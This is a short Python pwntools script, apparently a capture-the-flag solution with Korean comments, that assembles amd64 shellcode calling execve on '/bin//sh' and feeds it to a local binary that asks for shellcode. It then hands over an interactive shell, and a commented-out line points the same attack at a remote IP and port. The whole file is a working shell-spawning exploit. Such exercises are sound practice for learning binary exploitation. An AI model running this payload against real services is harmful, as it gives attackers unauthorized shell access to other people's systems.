#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.bits = 64
# context.log_level = 'debug'

shellcode_asm = """
	push rax           # 문자열의 끝을 나타내기 위함 (Optional, init to 0)
    or eax, 0x68732F2F

    shl rax, 32

    or rax, 0x6E69622F

    push rax
    lea rdi, [rsp]

    push 0x3b
    pop rax

    syscall
"""

shellcode = asm(shellcode_asm)
# shellcode = asm(shellcraft.sh())

p = process('./main')
# p = remote('IP', PORT)

p.sendafter(b"Give me your shellcode > ", shellcode)

p.interactive()